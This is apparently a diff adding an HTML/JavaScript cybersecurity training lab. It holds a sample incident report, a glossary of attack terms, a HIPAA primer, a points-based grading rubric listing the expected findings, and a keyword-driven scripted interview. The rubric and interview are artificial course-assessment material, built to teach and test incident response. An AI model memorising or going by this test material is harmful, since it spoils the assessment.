+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">NIST Cybersecurity Framework Analysis</p>
+
+      <p style="margin-bottom:10px;"><strong style="color:var(--text-bright);">Identify:</strong> Meridian had not formally classified its invoicing system as a high-risk asset despite the fact that it processes vendor payments totaling over $2M per month. The sensitivity of the data in the system — payment routing numbers, vendor bank accounts, pending financial transactions — was not reflected in the access controls applied to it. Had a formal asset risk assessment been completed, the invoicing system would likely have been flagged as requiring stronger authentication and tighter privilege controls.</p>
+
+      <p style="margin-bottom:10px;"><strong style="color:var(--text-bright);">Protect:</strong> Three protective controls were either absent or insufficient. First, MFA was not enforced on VPN, leaving credential theft as a complete bypass of network access controls. Second, role-based access control in the invoicing system was not implemented in alignment with actual job responsibilities, violating least privilege. Third, phishing awareness training had not been refreshed since onboarding, leaving staff unprepared to recognize a convincing spoofed email. Each of these failures independently contributed to the outcome.</p>
+
+      <p style="margin-bottom:10px;"><strong style="color:var(--text-bright);">Detect:</strong> The SIEM generated a valid, relevant alert within minutes. However, the detection capability was undermined by the response process: no escalation path existed for this alert type during non-business hours, and no additional detection layer (such as alerts on changes to payment routing numbers) was configured at the application level. Detection tools were in place; detection processes were not.</p>
+
+      <p style="margin-bottom:10px;"><strong style="color:var(--text-bright);">Respond:</strong> Once the incident was identified through the finance team's reconciliation — not through the SIEM alert — the response was fast and effective. The compromised account was disabled within 7 minutes of the security team being notified. The banking partner was contacted within 2 hours. Forensic preservation of logs and application audit trails was initiated within the first hour. The response process functioned well once triggered; the problem was the 22-hour delay in triggering it.</p>
+
+      <p style="margin-bottom:20px;"><strong style="color:var(--text-bright);">Recover:</strong> Payment records were restored from the application's nightly backup with no data loss. Both vendors whose payment records were modified were notified directly and asked to verify their banking information on file. The wire recall process was initiated with the bank; $28,000 of the $42,000 transferred has been recovered as of this report. The remaining balance is in dispute resolution. Torres's account was re-provisioned with correctly scoped permissions after review, and Torres returned to work the following day. No systems required rebuilding or reimaging.</p>
+
+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">Security Control Gaps</p>
+      <p style="margin-bottom:20px;">The most significant gap in this incident was the absence of MFA on the corporate VPN. A single set of credentials — obtained through a phishing page in less than two minutes — was sufficient for complete network access. This is a foundational control failure. The second major gap was the lack of least-privilege enforcement in the invoicing system: access provisioning appears to have been done for convenience rather than necessity, and no periodic access review had been conducted to right-size permissions. The third gap is in the SIEM response workflow: the tool detected the intrusion in real time, but the absence of an escalation path for medium-severity off-hours alerts meant that detection did not translate into a timely response. Finally, the lapse in phishing training left staff without the knowledge to identify a relatively straightforward social engineering attempt. These gaps did not independently cause the breach — they compounded each other. Closing any one of them would likely have prevented or significantly limited the incident.</p>
+
+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">Recommendations</p>
+      <p style="margin-bottom:10px;"><strong style="color:var(--text-bright);">Immediate (0–7 days):</strong> Enable MFA on all VPN accounts without exception. This is the single highest-priority action and should not wait. Additionally, force a password reset for all accounts that may share credentials with the phishing page domain (anyone who may have been targeted by this or similar campaigns). Conduct an emergency audit of invoicing system permissions and revoke any access that exceeds what each role actually requires. Preserve all logs, application audit trails, and VPN records related to this incident in tamper-evident storage for potential legal proceedings.</p>
+      <p style="margin-bottom:10px;"><strong style="color:var(--text-bright);">Short-term (1–30 days):</strong> Define and implement a real-time escalation policy for SIEM alerts involving off-hours access to sensitive systems. Configure application-level alerts for changes to vendor payment routing data. Launch a company-wide phishing awareness training session and establish a recurring annual schedule. Implement DMARC, DKIM, and SPF on Meridian's email domains to reduce the effectiveness of future spoofing attempts. Conduct a broader review of account privilege assignments across business-critical applications.</p>
+      <p style="margin-bottom:20px;"><strong style="color:var(--text-bright);">Long-term (30–90 days):</strong> Extend MFA requirements beyond VPN to all internal systems that handle sensitive financial or operational data. Establish a formal asset classification policy that ties security controls (access restrictions, monitoring intensity, alert thresholds) to the sensitivity of the data a system holds. Implement a periodic access recertification process — every 6 months, managers should review and reconfirm the access needs of their team members. Consider engaging an external firm for a red team exercise to test phishing resilience and VPN access controls after the above changes are implemented.</p>
+
+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">Legal &amp; Compliance Considerations</p>
+      <p style="margin-bottom:20px;">Based on the forensic review conducted to date, no customer personal data, payment card numbers, or other regulated consumer information was accessed during this incident. The attacker's activity was confined to vendor payment records — commercial data — which does not trigger notification requirements under applicable state consumer breach notification laws or PCI-DSS. Legal counsel has been briefed and concurs with this assessment, pending completion of the full forensic review. All incident documentation, SIEM logs, application audit trails, and VPN records have been preserved. If the wire recovery process fails to resolve the outstanding $14,000, Meridian's legal team is prepared to file a referral with the FBI's Internet Crime Complaint Center (IC3). No employee disciplinary action is anticipated; the incident resulted from an organizational control failure, not individual misconduct.</p>
+
+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">Analyst Ethics Statement</p>
+      <p style="margin-bottom:8px;">J. Torres, the employee whose credentials were stolen, acted in good faith and was the victim of a well-crafted social engineering attack. This report makes no finding of negligence or misconduct on Torres's part. The failure to protect against credential theft through phishing was an organizational one — the company did not provide recent awareness training, did not enforce MFA, and did not implement account controls that would have limited the damage even if credentials were stolen. Assigning personal blame to Torres would be both factually incorrect and ethically inappropriate.</p>
+      <p>As the analyst on this case, I conducted my investigation using only data and access provided to me by the client for this purpose. I have not disclosed any findings, logs, or client information to any third party outside of this engagement. All findings in this report reflect my honest assessment of the evidence. Where uncertainty exists, I have said so explicitly rather than overstating my conclusions.</p>
+
+    </div>
+  </div>
+
+  <!-- COMMON ERRORS -->
+  <div class="card">
+    <h3>Common Errors &amp; Fixes</h3>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">SIEM — "Database not loaded yet"</p>
+    <p style="color:#a8b8d0; font-size:13px;">The SIEM requires an internet connection to load the database engine. Check your connection and refresh the page. If you're in a restricted network environment, ask your instructor.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">SIEM — Query returns no rows when you expect results</p>
+    <p style="color:#a8b8d0; font-size:13px;">Check your spelling, capitalization, and quotes. SQLite string comparisons are case-sensitive. Try <code>SHOW TABLES;</code> first to confirm the database loaded correctly.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">Python — <code>python: command not found</code></p>
+    <p style="color:#a8b8d0; font-size:13px;">Try <code>python3</code> instead of <code>python</code>. On Windows, try <code>py</code>. If none work, Python may not be installed — ask your instructor.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">Python — <code>FileNotFoundError: auth.log</code></p>
+    <p style="color:#a8b8d0; font-size:13px;">Your script and <code>auth.log</code> must be in the same folder. In your terminal, use <code>cd</code> to navigate to that folder before running the script. Use <code>ls</code> (Mac/Linux) or <code>dir</code> (Windows) to confirm both files are there.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">Python — Script runs but prints nothing</p>
+    <p style="color:#a8b8d0; font-size:13px;">This usually means your filtering condition isn't matching anything, or your threshold is set too high. Add a temporary <code>print(line)</code> inside your loop to verify lines are being read. Check what you're searching for against actual lines in the file.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">PDF export — content gets cut off</p>
+    <p style="color:#a8b8d0; font-size:13px;">In your browser's print dialog, set margins to "Minimum" or "None" and make sure "Background graphics" is enabled. If text fields are too long, they may wrap across pages — that's normal.</p>
+  </div>
+
+  <!-- GLOSSARY -->
+  <div class="card">
+    <h3>Glossary</h3>
+    <p style="color:#a8b8d0; font-size:13px; margin-bottom:14px;">Terms you may encounter during this investigation.</p>
+
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:0;">
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Brute Force Attack</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">An attack where an adversary tries many passwords in rapid succession hoping one will work. Detected by large volumes of failed login attempts from the same source.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Persistence</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A technique attackers use to maintain access to a system even after a reboot or password change. Common methods include scheduled tasks, backdoor accounts, and startup scripts.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Cron Job</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A scheduled task on a Linux system that runs a command automatically at a set interval. Stored in files under <code>/etc/cron.d/</code> or via the <code>crontab</code> command. Attackers use these for persistence.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">C2 / Command &amp; Control</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A server controlled by an attacker that receives connections from compromised systems. An infected machine "beacons" out to C2 regularly to receive instructions or exfiltrate data.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Reverse Shell</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A technique where the compromised machine initiates a connection back to the attacker, giving them an interactive shell. This bypasses inbound firewall rules since the connection goes outbound.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Exfiltration</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Unauthorized transfer of data out of a network. In this investigation, look at what data was queried from the database and whether it could have been sent to an external destination.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">IOC — Indicator of Compromise</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Evidence that a system has been attacked or breached. Examples: suspicious IP addresses, unexpected user accounts, unusual processes, modified files, or anomalous network traffic.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Privilege Escalation</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Gaining higher-level permissions than originally obtained. On Linux, this often means moving from a regular user to root. Watch for accounts added to the <code>sudo</code> group.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">PHI — Protected Health Information</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Any health-related information that can identify an individual. Includes names, dates of birth, diagnoses, insurance IDs, and billing records. Protected under HIPAA in the United States.</p>
+      </div>
+      <div style="padding:10px 12px; border-bottom:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Anti-Forensics</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Techniques used by attackers to hide their activity or hinder investigation. Common examples: deleting log files, clearing shell history, renaming malicious files to look legitimate.</p>
+      </div>
+      <div style="padding:10px 12px; border-right:1px solid #21262d;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Least Privilege</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">A security principle stating that users and systems should only have the minimum access needed to do their job. Violations create unnecessary risk if an account is compromised.</p>
+      </div>
+      <div style="padding:10px 12px;">
+        <p style="color:#79c0ff; font-size:12px; font-weight:bold;">Network Segmentation</p>
+        <p style="color:#a8b8d0; font-size:12px; line-height:1.6;">Dividing a network into isolated zones so that a breach in one area doesn't automatically give access to everything else. A flat network (no segmentation) means one compromised host can reach all others.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- HIPAA PRIMER -->
+  <div class="card">
+    <h3>HIPAA Breach Notification — What You Need to Know</h3>
+    <p style="color:#a8b8d0; font-size:13px; margin-bottom:12px;">You will need to address HIPAA obligations in your final report. Here are the key facts — you'll need to apply them to this specific incident yourself.</p>
+
+    <div style="display:flex; flex-direction:column; gap:10px;">
+      <div class="alert alert-blue" style="font-size:13px;">
+        <strong>What triggers notification?</strong> A breach of unsecured PHI that has not been shown to have a low probability of compromise. If an unauthorized party accessed systems containing PHI, notification is presumed required unless proven otherwise.
+      </div>
+      <div class="alert alert-blue" style="font-size:13px;">
+        <strong>Who must be notified?</strong> Affected individuals must be notified. If 500+ individuals in a state are affected, prominent media outlets in that state must also be notified. The Department of Health &amp; Human Services (HHS) must always be notified.
+      </div>
+      <div class="alert alert-blue" style="font-size:13px;">
+        <strong>When?</strong> Notification to individuals and HHS must occur within <strong>60 calendar days</strong> of discovering the breach. There is no minimum — earlier is better.
+      </div>
+      <div class="alert alert-yellow" style="font-size:13px;">
+        <strong>Your job in the report:</strong> Based on what you found, argue whether this incident meets the threshold for mandatory notification — and why. Don't just say "yes" or "no" — support it with your findings.
+      </div>
+    </div>
+  </div>
+
+  <!-- REPORT WRITING TIPS -->
+  <div class="card">
+    <h3>Tips for Writing Your Report</h3>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:12px 0 6px;">Executive Summary</p>
+    <p style="color:#a8b8d0; font-size:13px;">Write this last, after you've completed everything else. Pretend you're explaining the incident to a business owner who is not technical — they need to know what happened, how bad it is, and what happens next. Avoid jargon. 3–5 sentences is enough.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">Attack Timeline</p>
+    <p style="color:#a8b8d0; font-size:13px;">Use your SIEM data and terminal findings together. The SIEM gives you timestamps for most events — use those as anchors. For things you found in the terminal that don't have a SIEM timestamp, use file timestamps or context clues to place them in order.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">Technical Findings</p>
+    <p style="color:#a8b8d0; font-size:13px;">Each finding should answer three questions: <em>What did you find? Where did you find it? Why does it matter?</em> Don't just list facts — connect them to the impact on the organization.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">NIST CSF Mapping</p>
+    <p style="color:#a8b8d0; font-size:13px;">For each of the five functions, ask: what did ClearPath do (or fail to do) in this area? Use your interview with Jordan to inform Identify and Protect. Use your SIEM and terminal findings for Detect. Your playbook covers Respond and Recover.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">Recommendations</p>
+    <p style="color:#a8b8d0; font-size:13px;">Be specific. "Improve security" is not a recommendation. "Implement MFA on all remote access methods within 30 days" is. Immediate recommendations should address the active threat. Short-term closes the gaps. Long-term builds a sustainable posture.</p>
+
+    <p style="color:#f0f6fc; font-size:13px; margin:14px 0 6px;">Ethics Section</p>
+    <p style="color:#a8b8d0; font-size:13px;">Think about your role as the analyst. You have access to sensitive data, logs, and systems. What obligations come with that? Consider confidentiality, scope of your investigation, and what you do if you discover something unexpected.</p>
+  </div>
+
+  <!-- NIST CSF QUICK REFERENCE -->
+  <div class="card">
+    <h3>NIST CSF Quick Reference</h3>
+    <div style="display:flex; flex-direction:column; gap:8px; margin-top:4px;">
+      <div style="display:flex; gap:12px; align-items:flex-start; padding:10px; background:#1c2128; border-radius:6px;">
+        <span class="badge badge-blue" style="min-width:70px; text-align:center; margin-top:1px;">IDENTIFY</span>
+        <p style="color:#a8b8d0; font-size:13px;">Understand your assets, risks, and environment. Who has access to what? What data do you hold? What are your most critical systems?</p>
+      </div>
+      <div style="display:flex; gap:12px; align-items:flex-start; padding:10px; background:#1c2128; border-radius:6px;">
+        <span class="badge badge-green" style="min-width:70px; text-align:center; margin-top:1px;">PROTECT</span>
+        <p style="color:#a8b8d0; font-size:13px;">Implement safeguards to limit the impact of an incident. Access controls, MFA, encryption, training, and patching all live here.</p>
+      </div>
+      <div style="display:flex; gap:12px; align-items:flex-start; padding:10px; background:#1c2128; border-radius:6px;">
+        <span class="badge badge-yellow" style="min-width:70px; text-align:center; margin-top:1px;">DETECT</span>
+        <p style="color:#a8b8d0; font-size:13px;">Identify when an incident is occurring. Logging, monitoring, alerting, and anomaly detection. Ask: how quickly was this attack noticed?</p>
+      </div>
+      <div style="display:flex; gap:12px; align-items:flex-start; padding:10px; background:#1c2128; border-radius:6px;">
+        <span class="badge badge-red" style="min-width:70px; text-align:center; margin-top:1px;">RESPOND</span>
+        <p style="color:#a8b8d0; font-size:13px;">Take action during and after an incident. Containment, eradication, communication, and execution of the IR plan.</p>
+      </div>
+      <div style="display:flex; gap:12px; align-items:flex-start; padding:10px; background:#1c2128; border-radius:6px;">
+        <span class="badge badge-blue" style="min-width:70px; text-align:center; margin-top:1px;">RECOVER</span>
+        <p style="color:#a8b8d0; font-size:13px;">Restore systems and operations. Validate that systems are clean before bringing them back online. Document lessons learned.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ===================== PAGE 9: GRADING RUBRIC ===================== -->
+<div class="page" id="page9">
+  <div class="card" style="border-color:var(--accent);">
+    <h2 style="color:var(--text-bright);">Grading Rubric</h2>
+    <p style="font-size:13px; color:var(--text-dim); margin-top:6px;">This project is worth <strong style="color:var(--accent);">110 points</strong> across 6 phases. Use this rubric to guide your work and make sure you've addressed every criterion before submitting.</p>
+    <div style="margin-top:16px; display:flex; gap:20px; flex-wrap:wrap; font-size:13px;">
+      <span><span style="color:var(--green); font-weight:bold;">Phase 1</span> Interview — 10 pts</span>
+      <span><span style="color:var(--green); font-weight:bold;">Phase 2</span> SIEM Notes — 15 pts</span>
+      <span><span style="color:var(--green); font-weight:bold;">Phase 3</span> Terminal Notes — 15 pts</span>
+      <span><span style="color:var(--green); font-weight:bold;">Phase 4</span> Python Task — 15 pts</span>
+      <span><span style="color:var(--green); font-weight:bold;">Phase 5</span> Playbook — 15 pts</span>
+      <span><span style="color:var(--green); font-weight:bold;">Phase 6</span> Final Report — 40 pts</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Phase 1 — Jordan Interview (10 pts)</h3>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">10 pts</div>
+      <div class="rubric-label">Topics uncovered during the Jordan interview
+        <div class="rubric-note">1 point per topic, up to 10 topics. Explore all of Jordan's dialogue options and ask about every relevant security concern to maximize your score.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Phase 2 — SIEM Notes (15 pts)</h3>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">Identified the attacker's source IP address from the SIEM logs</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">Identified the brute force pattern and the total number of failed login attempts
+        <div class="rubric-note">Your notes should name the attack type and include the specific count.</div>
+      </div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Noted the suspicious account that appeared in the logs after the breach</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">Identified the database queries that accessed sensitive patient records</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Noted the suspicious outbound connection and the port used for C2 communication</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">SIEM notes are substantive
+        <div class="rubric-note">Brief, one-word entries will not receive credit. Write complete observations.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Phase 3 — Terminal Notes (15 pts)</h3>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">Identified the backdoor user account created on the server</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">Found and documented the malicious scheduled task (cron job)</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Identified the malicious payload file dropped on the compromised system</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Noted evidence of anti-forensics (command history tampering)</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Ran a port scan and noted any exposed or unexpected services</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Identified strings or indicators associated with the reverse shell / C2 beacon</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Terminal notes are substantive
+        <div class="rubric-note">Document what commands you ran and what each finding means, not just the raw output.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Phase 4 — Python Task (15 pts)</h3>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">4 pts</div>
+      <div class="rubric-label">Script output correctly identifies the attacker's IP address</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Script output shows the correct number of failed login attempts</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">Bug explanations describe what was wrong in the original script and how each bug was fixed
+        <div class="rubric-note">Don't just say "I fixed it" — explain the specific error and the correction you made.</div>
+      </div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Q1: Correctly identifies the IP address flagged by the script</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Q2: Correctly identifies the type of attack the script detected</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Q3: Maps the detected attack to the correct NIST CSF function with justification</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Q4: Proposes a meaningful improvement to the script or detection process</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Phase 5 — NIST Playbook (15 pts)</h3>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Incident description field completed</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Incident classification and severity level selected</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">IDENTIFY: Named the affected systems and/or accounts involved in the breach</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">IDENTIFY: Acknowledged PHI/HIPAA risk and potential data exposure</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">PROTECT: Listed the security controls that were missing and would have prevented the breach</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">DETECT: Explained how the breach was eventually detected and what monitoring gaps allowed it to go unnoticed</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">RESPOND: Documented specific containment steps taken and who should be notified
+        <div class="rubric-note">Both the containment actions and the notification plan must be filled out for full credit.</div>
+      </div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">RECOVER: Documented recovery steps and process improvements to prevent recurrence</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Phase 6 — Final Report (40 pts)</h3>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">5 pts</div>
+      <div class="rubric-label">Executive summary written
+        <div class="rubric-note">Must be at least 40 words to receive full credit.</div>
+      </div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">3 pts</div>
+      <div class="rubric-label">Attack timeline includes the attacker's IP address and the key timestamp of the initial breach</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Finding 1: Brute force attack documented with supporting evidence</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Finding 2: Backdoor account documented with supporting evidence</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Finding 3: Cron-based persistence mechanism documented</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">2 pts</div>
+      <div class="rubric-label">Finding 4: Database exfiltration of patient records documented</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Finding 5: Anti-forensics / evidence tampering documented</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">6 pts</div>
+      <div class="rubric-label">NIST CSF section addresses all 5 functions: Identify, Protect, Detect, Respond, and Recover
+        <div class="rubric-note">All five functions must be present and substantive for full credit.</div>
+      </div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">5 pts</div>
+      <div class="rubric-label">Control gaps section identifies the specific security controls that were missing</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">5 pts</div>
+      <div class="rubric-label">Recommendations cover all three timeframes: immediate, short-term, and long-term</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">4 pts</div>
+      <div class="rubric-label">Legal section addresses HIPAA breach notification obligations
+        <div class="rubric-note">Consider: who must be notified, by when, and under what regulation.</div>
+      </div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Both ethics sections completed</div>
+    </div>
+    <div class="rubric-row">
+      <div class="rubric-pts" style="color:var(--accent);">1 pt</div>
+      <div class="rubric-label">Analyst name filled in on the report header</div>
+    </div>
+  </div>
+</div>
+
+<!-- sql.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.2/sql-wasm.js"></script>
+
+<script>
+// ===================== NAVIGATION =====================
+const pages = document.querySelectorAll('.page');
+const navBtns = document.querySelectorAll('.nav-btn');
+function goTo(n) {
+  pages.forEach((p,i) => p.classList.toggle('active', i===n));
+  navBtns.forEach((b,i) => {
+    b.classList.remove('active');
+    if(i===n) b.classList.add('active');
+  });
+  window.scrollTo(0,0);
+}
+
+// ===================== JORDAN INTERVIEW =====================
+const jordanResponses = [
+  {
+    keys: ['mfa','multi-factor','two-factor','2fa','authenticator','multifactor','two factor'],
+    topic: 'jt-mfa',
+    text: "MFA? We've been meaning to set that up for a while. It's on the roadmap. Right now it's just usernames and passwords for everything — including SSH. I know, I know. We kept pushing it back because it was disruptive to the workflow and the staff complained last time we tried to change anything."
+  },
+  {
+    keys: ['password','passwords','credential','credentials','complexity','policy'],
+    topic: 'jt-passwords',
+    text: "We have a policy on paper — minimum 8 characters, supposed to change every 90 days. But honestly, enforcement is loose. We don't have an automated system that forces it. I'll be honest with you: some of the service accounts have had the same password for over a year. It's a small team and people push back on password changes."
+  },
+  {
+    keys: ['logs','logging','log retention','siem','monitoring','log file','log files'],
+    topic: 'jt-logging',
+    text: "We do have logging enabled on the Linux server — auth logs, syslog, that kind of thing. We set up a basic centralized log collector about 6 months ago. Retention is 30 days, which I've heard might not be enough. The SIEM alerts fire for some things but we don't have someone watching them in real time. It's more of a 'check in the morning' situation."
+  },
+  {
+    keys: ['backup','backups','recovery','restore','disaster recovery'],
+    topic: 'jt-backup',
+    text: "We do nightly backups of the database to an external drive on-site. We also have a cloud backup that runs weekly — that one is offsite at least. But I'll admit we haven't tested a full restore in probably... eight months? Maybe longer. We assume it works, but we've never validated it under pressure."
+  },
+  {
+    keys: ['framework','nist','cis controls','iso 27001','compliance','standard','standards'],
+    topic: 'jt-framework',
+    text: "We adopted the NIST Cybersecurity Framework about two years ago — or at least we said we did. We did a gap assessment, made a list of things to improve, and then... life got in the way. The core functions make sense to us but implementation has been inconsistent. Some of the Protect and Detect controls just never got fully built out."
+  },
+  {
+    keys: ['incident','incident response','ir plan','playbook','procedure','procedures','response plan'],
+    topic: 'jt-incident',
+    text: "We have a document called an Incident Response Plan — it's about two years old. I don't think anyone has read it recently. We've never actually run a tabletop exercise or tested it. This is, honestly, the first real incident we've had where we needed it, and I had to dig to find the document this morning."
+  },
+  {
+    keys: ['database','db','sql','data','records','patient','phi','health','billing','sensitive'],
+    topic: 'jt-database',
+    text: "The main database holds patient billing records — names, dates of birth, insurance information, some diagnosis codes. It's technically PHI. Access is supposed to be role-based but we had a contractor in last quarter who needed temporary access and I'm not sure that was fully revoked. The database runs on the same Linux server that hosts our other services."
+  },
+  {
+    keys: ['network','firewall','vlan','segmentation','ports','ssh','remote access','vpn'],
+    topic: 'jt-network',
+    text: "We have a hardware firewall at the perimeter. SSH is open on port 22 to the internet — I know that's not ideal, but our remote staff need access and setting up a VPN was another project that got deprioritized. We don't have internal network segmentation; the billing database and the web server are on the same flat network."
+  },
+  {
